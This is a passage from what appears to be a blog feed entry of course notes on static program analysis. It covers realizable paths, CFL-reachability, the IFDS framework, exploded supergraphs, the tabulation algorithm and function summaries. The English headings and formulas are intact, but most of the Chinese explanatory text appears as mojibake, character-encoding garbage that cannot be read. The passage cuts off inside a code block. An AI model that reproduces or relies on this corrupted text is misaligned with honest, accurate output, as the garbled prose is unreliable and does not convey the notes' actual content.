            <tag> é™æ€ç¨‹åºåˆ†æ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆIFDSï¼‰</title>
      <link href="/pl-%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0%EF%BC%88IFDS%EF%BC%89/"/>
      <url>/pl-%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0%EF%BC%88IFDS%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="Feasible-and-Realizable-Paths"><a href="#Feasible-and-Realizable-Paths" class="headerlink" title="Feasible and Realizable Paths"></a>Feasible and Realizable Paths</h1><h2 id="In-Feasible-Paths"><a href="#In-Feasible-Paths" class="headerlink" title="(In)Feasible Paths"></a>(In)Feasible Paths</h2><blockquote><p><strong>Infeasible Paths:</strong> Paths in CFG that do not correspond to actual executions.</p></blockquote><p>ç¨‹åºåœ¨CFGä¸­ä¼šå­˜åœ¨ä¸è¢«æ‰§è¡Œåˆ°è·¯å¾„ï¼Œè¿™äº›è·¯å¾„ä¼šæ±¡æŸ“åˆ†æç»“æœï¼Œç»™é™æ€åˆ†æå¸¦æ¥ä¸åˆ©å½±å“ã€‚</p><a id="more"></a><p>ç„¶è€Œï¼Œé™æ€ç¨‹åºåˆ†ææ— æ³•åˆ¤æ–­ä¸€ä¸ªè¾¹æ˜¯å¦èƒ½è¢«æ‰§è¡Œåˆ°ï¼Œä¾‹å¦‚ä¸‹é¢ä»£ç ï¼Œè¯­ä¹‰ä¸Šè®¤ä¸ºç¨‹åºä¸ä¼šèµ° <code>r=-1</code> çš„è·¯å¾„ï¼Œä½†æ˜¯ageæ˜¯å‡½æ•°çš„è¾“å…¥ï¼Œé™æ€åˆ†ææ— æ³•åˆ¤æ–­ï¼š</p><p><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆIFDSï¼‰/image-20200912200105336.png" alt="image-20200912200105336"></p><p>ç„¶è€Œï¼Œé™æ€åˆ†æå¯ä»¥è¯†åˆ«éƒ¨åˆ†ä¸å¯è¡Œçš„è·¯å¾„ï¼Œå¦‚ä¸‹å›¾ï¼š</p><p><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆIFDSï¼‰/image-20200912201058304.png" alt="image-20200912201058304"></p><p>å°½ç®¡ <code>r=-1</code> æ— æ³•é¿å…ï¼Œä½†æ˜¯åœ¨<code>call foo(30) -&gt; exit foo -&gt; x=return foo</code>è¿™ä¸ªä¸å¯è¡Œè¾¹æ˜¯å¯ä»¥åˆ†æå‡ºçš„ã€‚</p><h2 id="Realizable-Paths"><a href="#Realizable-Paths" class="headerlink" title="Realizable Paths"></a>Realizable Paths</h2><blockquote><p><strong>Realizable Paths:</strong> The paths in which â€œreturnsâ€ are matched with corresponding â€œcallsâ€.</p></blockquote><p>æ‰€è°“ Realizable Paths å³æŒ‡é‚£äº›ä¸è°ƒç”¨ç‚¹ç›¸å¯¹åº”çš„è¿”å›è·¯å¾„ï¼Œæ³¨æ„ Realizable Paths ä¸ä¸€å®šå¯æ‰§è¡Œï¼Œä½†æ˜¯ unrealizable paths ä¸€å®šä¸å¯æ‰§è¡Œã€‚</p><p>åˆ¤æ–­è¿™äº›è¾¹æ˜¯å¦ realizable çš„ä¸€ä¸ªæ€è·¯æ˜¯åœ¨è°ƒç”¨å’Œè¿”å›è¾¹ä¸ŠåŠ  â€œ(â€œ å’Œ â€œ)â€ï¼Œæ¥ç€å°±å¯ä»¥ç”¨æ‹¬å·åŒ¹é…çš„æ–¹å¼åˆ¤æ–­è·¯å¾„æ˜¯å¦realizableï¼š</p><p><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆIFDSï¼‰/image-20200912202526474.png" alt="image-20200912202526474"></p><p>å¦‚ä¸Šæ‰€ç¤ºï¼Œ<code>(1</code>åªèƒ½åŒ¹é…<code>)1</code>ï¼Œ<code>(2</code>åªèƒ½åŒ¹é…<code>)2</code>ã€‚</p><h1 id="CFL-Reachability"><a href="#CFL-Reachability" class="headerlink" title="CFL-Reachability"></a>CFL-Reachability</h1><p>å…·ä½“æ¥è¯´ï¼Œç”¨ CFL-Reachability è§£å†³è·¯å¾„realizableé—®é¢˜ï¼š</p><blockquote><p><strong>CFL-Reachability:</strong> A path is considered to connect two nodes A and B, or <strong>B is reachable from A</strong>, only if the concatenation of the labels on the edges of the path is a word in a specified <strong>context-free language</strong>.</p></blockquote><p>ç®€å•è¯´ï¼Œåœ¨è¾¹ä¸Šæ·»åŠ labelï¼Œé‚£ä¹ˆä¸€ä¸ªè·¯å¾„realizableå³è¿™ä¸ªè·¯å¾„ä¸Šçš„è¾¹labelç»„æˆäº†ä¸€ä¸ªwordï¼Œè¿™ä¸ªwordæ˜¯ç¬¦åˆå®šä¹‰çš„ä¸Šä¸‹æ–‡æ— å…³æ–‡æ³•ï¼ˆCFLï¼‰çš„ã€‚</p><p>ä¸Šä¸‹æ–‡æ— å…³æ–‡æ³•ç”±ä¸Šä¸‹æ–‡æ— å…³è¯­æ³•ï¼ˆCFG, context-free grammarï¼‰å®šä¹‰â€”â€”ç¼–è¯‘åŸç†ä¸­çš„æ¦‚å¿µï¼Œè¯¦æƒ…è§é™„å½•ã€‚</p><p>è·¯å¾„ realizable é—®é¢˜è¢«CFLè½¬åŒ–ä¸ºéƒ¨åˆ†æ‹¬å·åŒ¹é…é—®é¢˜ï¼ˆPartially Balanced-Parenthesis Problemï¼‰ï¼š</p><ul><li>å¯¹äºæ¯ä¸€ä¸ªå³æ‹¬å·â€œ)iâ€ éƒ½éœ€è¦æœ‰ä¸€ä¸ªå¯¹åº”çš„å·¦æ‹¬å·â€œ(iâ€ï¼Œä½†åä¹‹åˆ™ä¸éœ€è¦â€”â€”å‡½æ•°è°ƒç”¨çš„è¾¹æ˜¯ä¸€å®šå¯è¾¾çš„ï¼›</li><li>å¯¹äºæ¯ä¸ªè°ƒç”¨ç‚¹iï¼Œå°†å…¶è°ƒç”¨è¾¹åŠ  â€œ(iâ€ çš„æ ‡ç­¾ï¼Œå°†å…¶è¿”å›è¾¹åŠ  â€œ)iâ€çš„æ ‡ç­¾ï¼›</li><li>å¯¹äºå…¶ä»–è¾¹æ·»åŠ â€œeâ€æ ‡ç­¾ã€‚</li></ul><p>å¦‚æ­¤å¯ä»¥å®šä¹‰å¦‚ä¸‹ä¸Šä¸‹æ–‡æ–‡æ³•ï¼š</p><p><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆIFDSï¼‰/image-20200912210815067.png" alt="image-20200912210706949" style="width:60%;"></p><p>ç¬¦åˆè¿™å¥—æ–‡æ³•çš„è·¯å¾„å°±æ˜¯å¯è¾¾çš„ã€‚</p><h1 id="Overview-of-IFDS"><a href="#Overview-of-IFDS" class="headerlink" title="Overview of IFDS"></a>Overview of IFDS</h1><p>IFDS[1] å®é™…æ˜¯ Interprocedural, Finite, Distributive, Subset Problemï¼Œå³ IFDS æ˜¯ç”¨æ¥è§£å†³è¿‡ç¨‹é—´æ•°æ®æµåˆ†æï¼ˆ<strong>interprocedural</strong> data flowï¼‰çš„é—®é¢˜ï¼Œè€Œè¿™äº›é—®é¢˜è¿˜éœ€æ»¡è¶³ä¸€ä¸‹æ¡ä»¶1. åˆ†æçš„domainæ˜¯æœ‰é™çš„ï¼ˆ<strong>finite</strong>ï¼‰ï¼›2. flow functionæ»¡è¶³åˆ†é…ç‡ï¼ˆ<strong>distributive</strong>ï¼‰ï¼›3. æ˜¯ä¸€ä¸ªå­é›†ç±»å‹çš„é—®é¢˜ï¼ˆ<strong>subset problem</strong>ï¼‰ã€‚</p><p>ä¸‹é¢å›é¡¾ä¸€ä¸‹å…ˆå‰æ•°æ®æµåˆ†æçš„ä¸€äº›ä¾‹å­æ˜¯å¦æ»¡è¶³ï¼š</p><ul><li>distributiveï¼š$F$ åœ¨$\sqcup$ä¸Šæ»¡è¶³åˆ†é…ç‡ï¼Œgen-killçš„é—®é¢˜éƒ½æ»¡è¶³ï¼›</li><li>finiteï¼šå‰ä¸‰ä¸ªé—®é¢˜æ˜¯ï¼Œä½†æœ‰äº›é—®é¢˜çš„domainæ˜¯infiniteçš„ï¼Œå¦‚constant propagationï¼›</li><li>subset problemï¼šå¯¹é›†åˆæ“ä½œçš„é—®é¢˜ï¼Œå‰ä¸‰ä¸ªé—®é¢˜éƒ½æ˜¯ã€‚</li></ul><h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><p>å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œå¯¹äºä¸€ä¸ªç»™å®šç¨‹åº Pï¼Œä»¥åŠä¸€ä¸ªæ•°æ®æµåˆ†æé—®é¢˜ Qï¼š</p><ul><li>é¦–å…ˆæ„å»º supergraph $G^*$ï¼Œæ¥ç€å®šä¹‰$Q$ çš„flow functionsï¼ˆç±»ä¼¼äºå…ˆå‰çš„è½¬æ¢å‡½æ•°ï¼‰ï¼›</li><li>å°†flow functionsè½¬åŒ–ä¸ºrepresentation relationsï¼Œåº”ç”¨äº$G^*$ï¼Œå¾—åˆ°exploded supergraph $G^#$ï¼›</li><li>å°†é—®é¢˜ Q è½¬åŒ–ä¸ºå›¾ $G^#$ ä¸Šçš„å¯è¾¾æ€§é—®é¢˜ï¼Œåº”ç”¨ Tabulation algorithm è®¡ç®—å¯è¾¾æ€§ï¼Œå¦‚ï¼šé—®é¢˜Qä¸ºReaching Definitionsï¼ˆåœ¨ç¨‹åºç‚¹nå¤„ï¼Œå˜é‡ $d$ æ˜¯å¦æœ‰æ–°å®šä¹‰ï¼Œdata fact $d \in MRP_n$ï¼‰ï¼Œé‚£ä¹ˆé—®é¢˜è½¬åŒ–ä¸ºåœ¨å›¾ $G^#$ ä¸Šæ˜¯å¦æœ‰ä»$<s_{main},0>\rightarrow<n,d>$çš„å¯è¾¾è·¯å¾„ã€‚</n,d></s_{main},0></li></ul><p><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆIFDSï¼‰/image-20200913152829431.png" alt="image-20200913152829431"></p><h2 id="MRP"><a href="#MRP" class="headerlink" title="MRP"></a>MRP</h2><p>IFDSèƒ½å¤Ÿæä¾›MRPçš„åˆ†æã€‚</p><p>å›å¿†å…ˆå‰åˆ†æï¼Œå¯¹äºä¸€ä¸ªè·¯å¾„ $p$ï¼Œå®šä¹‰è½¬æ¢å‡½æ•°ä¸º $pf_p$ï¼Œé‚£ä¹ˆ $pf_{p}=f_{n} \circ \ldots \circ f_{2} \circ f_{1}$</p><p>é‚£ä¹ˆä»startè‡³nçš„è·¯å¾„$Paths(start, n)$ï¼ŒMOP çš„åˆ†æç»“æœä¸ºï¼š</p><script type="math/tex; mode=display">\mathrm{MOP}_{n}=\sqcup_{p \in \mathrm{Paths}(\text {start}, n)} p f_{p}(\perp)</script><p>è€Œ MRP çš„åˆ†æç»“æœä¸ºï¼š</p><script type="math/tex; mode=display">\operatorname{MRP}_{n}=\sqcup_{p \in \operatorname{RPaths}(s t a r t, n)} p f_{p}(\perp)</script><p>åŒºåˆ«å°±åœ¨äº MRP åªåˆ†æReachable Pathï¼Œå› æ­¤ MRP æ¯”MOPæ›´å‡†ç¡®ï¼š</p><script type="math/tex; mode=display">MRP_n \sqsubseteq MOP_n</script><h1 id="Supergraph-and-Flow-Functions"><a href="#Supergraph-and-Flow-Functions" class="headerlink" title="Supergraph and Flow Functions"></a>Supergraph and Flow Functions</h1><h2 id="Supergraph"><a href="#Supergraph" class="headerlink" title="Supergraph"></a>Supergraph</h2><p>åœ¨IFDSä¸­ï¼Œç¨‹åºè¢«è¡¨ç¤ºä¸ºSupergraphï¼Œè®°ä¸º$G^<em>=(N^</em>,E^*)$ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><ul><li>$G^*$ æ˜¯æ‰€æœ‰å‡½æ•°å†…æ§åˆ¶æµå›¾ï¼ˆ$G_1$, $G_2$,â€¦ï¼‰çš„é›†åˆï¼›</li><li>æ¯ä¸€ä¸ªæ§åˆ¶æµå›¾ $G_p$ æœ‰ä¸€ä¸ªå”¯ä¸€å¼€å§‹èŠ‚ç‚¹ $s_p$ å’Œç»“æŸèŠ‚ç‚¹ $e_p$ï¼›</li><li>æ¯ä¸€ä¸ªè¿‡ç¨‹é—´è°ƒç”¨éƒ½å­˜åœ¨ä¸€ä¸ª$Call_p$èŠ‚ç‚¹ï¼ˆcall nodeï¼‰å’Œ$Ret_p$èŠ‚ç‚¹ï¼ˆreturn-site nodeï¼‰ã€‚</li></ul><p><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆIFDSï¼‰/image-20200913155502967.png" alt="image-20200913155502967" style="width:80%;"></p><p>æ¯ä¸ªè°ƒç”¨å­˜åœ¨ä¸‰ç±»è¾¹ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><ul><li>call-to-return-site edgeï¼šè¿æ¥$Call_p$è‡³$Ret_p$çš„è¾¹ï¼ˆç´«è‰²ï¼‰ï¼›</li><li>call-to-start edgeï¼šè¿æ¥$Call_p$è‡³$s_p$çš„è¾¹ï¼ˆç»¿è‰²ï¼‰ï¼Œè¡¨ç¤ºä»call-siteè‡³è°ƒç”¨å‡½æ•°å…¥å£ï¼›</li><li>exit-to-return-site edgeï¼šè¿æ¥$e_p$è‡³$Ret_p$ï¼ˆè“è‰²ï¼‰ï¼Œè¡¨ç¤ºè°ƒç”¨å®Œæˆè¿”å›åŸä¸Šä¸‹æ–‡ã€‚</li></ul><p><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆIFDSï¼‰/image-20200913155944787.png" alt="image-20200913155944787" style="width:80%;"></p><h2 id="Flow-Function"><a href="#Flow-Function" class="headerlink" title="Flow Function"></a>Flow Function</h2><p>Flow functionå®šä¹‰ä¸ºåŒ¿åå‡½æ•°ï¼Œå½¢å¼ä¸º$\lambda e_{p a r a m} \cdot e_{b o d y}$ï¼Œå³â€œè¾“å…¥.å‡½æ•°ä½“â€ã€‚</p><p>å‡è®¾å¯¹â€œæœªåˆå§‹åŒ–å˜é‡â€é—®é¢˜è®¾è®¡Flow Functionï¼š</p><blockquote><p>Possibly-uninitialized variables: for each node $nâˆˆN^*$, determine the set of variables that may be uninitialized before execution reaches n.</p></blockquote><p>æ³¨æ„æ¼”ç¤ºæ—¶å¯¹æ¯ä¸ªè¾¹è®¾è®¡å‡½æ•°ï¼ŒçœŸå®æƒ…å†µä¸‹åªéœ€è¦å¯¹å››ç§ç±»å‹çš„è¾¹åšå®šä¹‰ï¼Œè€Œä¸æ˜¯æ‰€æœ‰è¾¹æ‰‹å·¥å®šä¹‰ã€‚</p><p><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆIFDSï¼‰/image-20200913161605544.png" alt="image-20200913161605544"></p><ol><li><p>ç¨‹åºåˆå§‹åŒ–ï¼Œå¯è§ <code>x, g</code> éƒ½æ²¡æœ‰èµ‹å€¼ï¼Œå› æ­¤å°†å…¶åŠ å…¥æœªå®šä¹‰é›†åˆ$S$ä¸­ï¼›</p></li><li><p>å¯¹äº<code>x=0</code>ï¼Œ<code>x</code>è¢«èµ‹å€¼ï¼Œå°†<code>x</code>ä»é›†åˆä¸­å‰”é™¤ï¼›</p></li><li><p>å¯¹äº$Call_p \rightarrow S_p$ï¼Œå°†å®å‚<code>x</code>çŠ¶æ€èµ‹å€¼åˆ°å½¢å‚<code>a</code>ä¸Šï¼Œå³<code>&lt;x/a&gt;</code>ï¼›</p></li><li>å¯¹äº<code>a=a-g</code>ï¼Œå¦‚æœaæˆ–gæœªå®šä¹‰ï¼Œé‚£ä¹ˆèµ‹å€¼ä¼šå‡ºé”™ï¼Œå°†aåŠ å…¥æœªå®šä¹‰é›†åˆï¼Œå¦åˆ™èµ‹å€¼æˆåŠŸï¼Œå°†aä»æœªèµ‹å€¼é›†åˆä¸­å»é™¤ï¼›</li><li>å¯¹äº$e_p \rightarrow Ret_p$ï¼Œåœ¨é›†åˆä¸­åˆ å»å½¢å‚ <code>a</code> çš„åˆ†æç»“æœï¼›</li><li>å¯¹äº$Call_p \rightarrow Ret_p$ï¼Œä¸å…ˆå‰è¿‡ç¨‹é—´åˆ†æç»“æœç±»ä¼¼ï¼Œè€ƒè™‘åˆ°<code>g</code>æ˜¯å…¨å±€å˜é‡ï¼Œé‚£ä¹ˆåœ¨$Call_p \rightarrow S_p$æ—¶ï¼Œ<code>g</code>çš„çŠ¶æ€ä¹Ÿä¼šåœ¨é›†åˆä¸­ä¼ è¿‡å»ï¼Œè°ƒç”¨å®Œgæ˜¯å¦å®šä¹‰æ˜¯ç”± <code>P()</code>å®ç°å†³å®šçš„ï¼ˆæ˜¯å¦å®šä¹‰çš„ç»“æœä»$e_p \rightarrow Ret_p$è¿™æ¡è¾¹ä¼ è¿‡æ¥ï¼‰ï¼Œ$Ret_p$ä¼šåš $\cup$ æ“ä½œï¼Œå› æ­¤è¿™é‡Œéœ€è¦åˆ é™¤ <code>g</code>ï¼Œä¿è¯æ›´å‡†ç¡®çš„ç»“æœã€‚</li></ol><h1 id="Exploded-Supergraph-and-Tabulation-Algorithm"><a href="#Exploded-Supergraph-and-Tabulation-Algorithm" class="headerlink" title="Exploded Supergraph and Tabulation Algorithm"></a>Exploded Supergraph and Tabulation Algorithm</h1><h2 id="Build-Exploded-Supergraph"><a href="#Build-Exploded-Supergraph" class="headerlink" title="Build Exploded Supergraph"></a>Build Exploded Supergraph</h2><p>é¦–å…ˆéœ€è¦å°† Flow Functionè½¬æ¢ä¸º representation relationï¼Œ representation relations å¯ç”¨ä¸€ä¸ªäºŒåˆ†å›¾è¡¨ç¤ºï¼Œå›¾ä¸­æœ‰ 2(D+1) ä¸ªèŠ‚ç‚¹ï¼ˆè‡³å¤š $(D+1)^2$ æ¡è¾¹ï¼‰ï¼Œ$D$ å…ˆå‰ä¹Ÿä»‹ç»è¿‡ï¼Œä½œä¸ºdataflow factsçš„é›†åˆï¼ˆé›†åˆå¿…é¡»æ˜¯æœ‰é™çš„ï¼‰ï¼Œè¿™é‡Œå°±æ˜¯å˜é‡çš„æ•°é‡ã€‚</p><p>ä¸€ä¸ªFlow function $f$ çš„ representation relationå®šä¹‰ä¸º$R_f$ï¼Œ $R_f\subseteq (D\cup 0) \times (D\cup 0)$ï¼Œå®é™…ä¸Šå°±æ˜¯æ˜ å°„äº†$f \rightarrow edges$ï¼š</p><p><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆIFDSï¼‰/image-20200913164759047.png" alt="image-20200913164759047"></p><ol><li><p>$R_f=\{(0,0)\}$ï¼Œæ— æ¡ä»¶åŠ ä¸€æ¡$0\rightarrow 0$è¾¹ï¼Œä¸‹æ–‡ä¼šè§£é‡Šè¯¥è¾¹çš„ä½œç”¨ï¼›</p></li><li><p>$R_f=\{(0,y)\mid y\in f(\emptyset)\}$ï¼Œå¯¹äº<code>f(_){return (y,_)}</code>çš„functionï¼Œå¢åŠ $0\rightarrow y$ï¼›</p></li><li><p>$R_f=\{(x, y) \mid y \notin f(\emptyset) \text { and } y \in f(\{x\})\}$ï¼Œå¯¹äº<code>f(x,_){return (y,_)}</code>çš„functionï¼Œå¢åŠ $x\rightarrow y$ã€‚</p></li></ol><p>ä»¥å›¾ä¸Šå››ä¸ªfunctionä¸ºä¾‹ï¼š</p><ul><li><p>å¯¹äº$\lambda\text{ } \mathrm{S} \cdot(\mathrm{S}-\{\mathrm{a}\}) \cup\{\mathrm{b}\}$ï¼Œé¦–å…ˆæ— æ¡ä»¶æ·»åŠ $0\rightarrow 0$è¾¹ï¼›æ¥ç€ç”±äºå…¶æ€»ä¼šè¿”å›<code>b</code>ï¼Œå› æ­¤ç¬¦åˆ2ï¼Œå¢åŠ $0\rightarrow b$ï¼›æœ€åè‹¥è¾“å…¥é™¤<code>a</code>ï¼Œ<code>b</code>ä»¥å¤–çš„å€¼ï¼Œç¬¦åˆ3ï¼Œæ·»åŠ $c\rightarrow c$ï¼›</p></li><li><p>å¯¹äº$\lambda\text{ } ifthenelse$ï¼Œå› ä¸ºæœ‰<code>f(a,_){return(a,b,_)}</code>ï¼Œå› æ­¤å¢åŠ $a\rightarrow a,a\rightarrow b$ï¼Œå…¶ä»–åŒä¸Šã€‚</p></li></ul><p>ä»æ­¤ä¹‹åï¼Œåˆ†æä¸å†éœ€è¦flow functionï¼Œåªéœ€è¦å°†Relationsåœ¨Supergraphä¸Šç”»å‡ºå³å¯ã€‚</p><p>æ ¹æ®Representation  Relationså¯ä»¥å¾—åˆ°$G^#$ï¼š</p><p><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆIFDSï¼‰/image-20200913175721703.png" alt="image-20200913175721703"></p><p><strong>ä¸ºä½•è¦æ·»åŠ  $0\rightarrow 0$ çš„è¾¹ï¼›</strong></p><p>å¯¹ä¸ä¸€ä¸ªç¨‹åºç‚¹pï¼Œå…¶ç»“æœæ˜¯ç”±å¤šä¸ªflow functionå½±å“ï¼Œè€Œåœ¨IFDSä¸Šå½±å“çš„ç»“æœç”±å›¾çš„å¯è¾¾æ€§è¡¨ç¤ºï¼Œè€ƒè™‘æœ‰$\lambda \text{ } S \cdot \{a\}$è¿™ä¸€ä¸ªfunctionï¼Œè‹¥æ²¡æœ‰$0\rightarrow0$ï¼Œé‚£ä¹ˆ<code>a</code>æ— æ³•å¯è¾¾ï¼Œåˆ†æç»“æœé”™è¯¯ï¼š</p><p><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆIFDSï¼‰/image-20200913175500202.png" alt="image-20200913175500202"></p><h2 id="Tabulation-Algorithm"><a href="#Tabulation-Algorithm" class="headerlink" title="Tabulation Algorithm"></a>Tabulation Algorithm</h2><p>é€šè¿‡å›¾å¯è¾¾æ€§æ¨å¯¼Possibly-uninitialized variablesï¼Œè¿˜éœ€æœ€åä¸€æ­¥ï¼Œå³åˆ¤æ–­è·¯å¾„æ˜¯å¦æˆç«‹ã€‚</p><p>ä¾‹å¦‚å¯¹äº$e_{main}$èŠ‚ç‚¹ä¸‹çš„$g$ï¼Œå¯ä»¥æ‰¾åˆ°$\langle S_{main},0\rangle \rightarrow \langle e_{main},g\rangle$çš„åˆæ³•è·¯å¾„ï¼Œå› æ­¤gæœ‰å¯èƒ½ä¸å­˜åœ¨å®šä¹‰ï¼š</p><p><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆIFDSï¼‰/image-20200913194055052.png" alt="image-20200913194055052" style="width:80%;"></p><p>è€Œå¯¹äº$Print(a,g)$èŠ‚ç‚¹ä¸‹çš„<code>g</code>ï¼Œå°½ç®¡å…¶å­˜åœ¨è·¯å¾„ï¼Œä½†æ˜¯è·¯å¾„åˆæ³•ï¼Œå› æ­¤gä¸å­˜åœ¨é›†åˆä¸­ï¼Œå³gä¸€å®šæ˜¯å·²å®šä¹‰çš„ã€‚</p><p><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆIFDSï¼‰/image-20200913194557198.png" alt="image-20200913194557198" style="width:80%;"></p><p>è®¡ç®—å›¾ä¸­ç‚¹çš„å¯è¾¾æ€§å³Tabulation Algorithmï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œå¯¹äºä»$\langle S_{main},0\rangle $å¯è¾¾çš„ç‚¹ç”¨è“è‰²ç‚¹è¡¨ç¤ºï¼Œè¯¥ç®—æ³•å°±æ˜¯æ‰¾å‡ºè¿™äº›å¯è¾¾ï¼ˆè“è‰²ï¼‰çš„ç‚¹ã€‚</p><p><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆIFDSï¼‰/image-20200913195133207.png" alt="image-20200913195133207"></p><p>ç®—æ³•å†…å®¹å¦‚ä¸‹ï¼Œå…¶å¤æ‚åº¦ä¸º$O(ED^3)$ï¼Œè¯¾ç¨‹ä¸­å¹¶æ²¡æœ‰æ—¶é—´è¯´æ˜æ—¶é—´ç»†èŠ‚ï¼š</p><p><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆIFDSï¼‰/image-20200913180807055.png" alt="image-20200913180807055"></p><p>ç®—æ³•ä¸­ä¸»è¦æ€æƒ³æ˜¯åœ¨æ¯ä¸ªexit nodeå¤„è¿›è¡ŒCFL-Reachability æ£€æŸ¥ï¼Œè€Œå…¶ä»–nodeä¹‹é—´è‡ªç„¶å¯è¾¾ï¼ˆç»¿è‰²ï¼‰ï¼›</p><p>æ­¤å¤–ï¼Œå¢åŠ summary edgeï¼Œè¿æ¥$\langle Call, d_m\rangle \rightarrow \langle Ret, d_n \rangle$ï¼Œä½œä¸ºè®°å¿†ï¼ˆe.g., $a\rightarrow \{b\}$, $b\rightarrow\{b, c\}$ï¼‰ï¼Œä¸‹æ¬¡åšè¯¥å‡½æ•°è°ƒç”¨æ—¶ä¸éœ€è¦é‡å¤è®¡ç®—è¢«è°ƒå‡½æ•°å†…éƒ¨çš„pathï¼š</p><p><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆIFDSï¼‰/image-20200913195831242.png" alt="image-20200913195831242"></p><h1 id="Function-summary"><a href="#Function-summary" class="headerlink" title="Function summary"></a>Function summary</h1><p>å¯¹äºç¨‹åºä¸­çš„åº“è°ƒç”¨å‡½æ•°ï¼Œå¯ä»¥ä½“ç°åšå‡½æ•°æ‘˜è¦ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><p><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆIFDSï¼‰/image-20201003173839070.png" alt="image-20201003173839070"></p><p>åªè¦åœ¨åº“ä¸Šè·‘ä¸€é IDFS å°±å¯ä»¥å¾—åˆ°å‡½æ•°æ‘˜è¦ï¼š</p><p><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆIFDSï¼‰/image-20201003204423702.png" alt="image-20201003204423702"></p><p>å‡½æ•°æ‘˜è¦ä¸éœ€è¦ä¿å­˜å‡½æ•°å†…éƒ¨è½¬æ¢è¿‡ç¨‹ï¼ˆè“è‰²çº¿ï¼‰ï¼Œåªéœ€è¦ä¿å­˜è½¬æ¢ç»“æœï¼ˆçº¢è‰²çº¿ï¼‰ï¼Œä½†æ˜¯è¿™æ ·çš„è¯åšæ‘˜è¦å°±å¾—è®¡ç®—æ¯ä¸ªå˜é‡çš„å¯è¾¾æ€§ï¼Œå³å¤æ‚åº¦æ˜¯$O(n^2)$ï¼Œnä¸ºå˜é‡ä¸ªæ•°ï¼ˆè¿˜åŒ…æ‹¬å…¨å±€å˜é‡ï¼‰ã€‚</p><p><strong>å‡½æ•°æ‘˜è¦å®é™…ä¸Šå½¢å¼</strong>æ˜¯$f: \langle gen, kill\rangle$ï¼Œæ¢å¥è¯è¯´$f(x)=gen\cup(x-kill)$ï¼Œå‡½æ•°æ‰§è¡Œåˆå§‹å€¼ä¸º$\langle\{\},\{\}\rangle$ï¼‰</p><p>åœ¨å‡½æ•°å†…åšæ•°æ®æµåˆ†æï¼Œtransferä¸º$\left(g_{1}, k_{1}\right) \circ\left(g_{2}, k_{2}\right)=\left(g_{2} \cup\left(g_{1}-k_{2}\right), k_{1} \cup k_{2}\right)$ï¼š</p><script type="math/tex; mode=display">\begin{aligned}f_{2} \circ f_{1}(x) &=gen_{2} \cup\left(\left(gen_{1} \cup\left(x-kill_{1}\right)\right)-kill_{2}\right) \\&=\left(gen_{2} \cup\left(gen_{1}-kill_{2}\right)\right) \cup\left(x-\left(kill_{1} \cup kill_{2}\right)\right)\\\end{aligned}</script><p>æ±‡èšç‚¹æ“ä½œä¸º$\left(g_{1}, k_{1}\right) \sqcap\left(g_{2}, k_{2}\right)=\left(g_{1} \cup g_{2}, k_{1} \cap k_{2}\right)$ï¼š</p><script type="math/tex; mode=display">\begin{aligned}\left(f_{1} \sqcap f_{2}\right)(x) &=f_{1}(x) \sqcap f_{2}(x) \\&=\left(g e n_{1} \cup\left(x-k i l l_{1}\right)\right) \cup\left(g e n_{2} \cup\left(x-k i l l_{2}\right)\right) \\&=\left(g e n_{1} \cup g e n_{2}\right) \cup\left(x-\left(k i l l_{1} \cap k i l l_{2}\right)\right)\end{aligned}</script><p>é€šè¿‡è¯æ˜ï¼Œå¯è§ç”¨ä»¥ä¸Šæ–¹æ³•åšå‡ºæ¥çš„å‡½æ•°æ‘˜è¦è¿›è¡Œæ•°æ®æµåˆ†æï¼Œåˆ†æç»“æœå’ŒåŸæ•°æ®æµåˆ†æå®Œå…¨ç›¸åŒ(å…·æœ‰å•è°ƒæ€§ã€åˆ†é…æ€§å’Œæ­£ç¡®æ€§)ã€‚</p><p>è¿™é‡Œä¸ªäººæœ‰ä¸ªç–‘æƒ‘ï¼Œè€ƒè™‘å¦‚ä¸‹ä»£ç ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 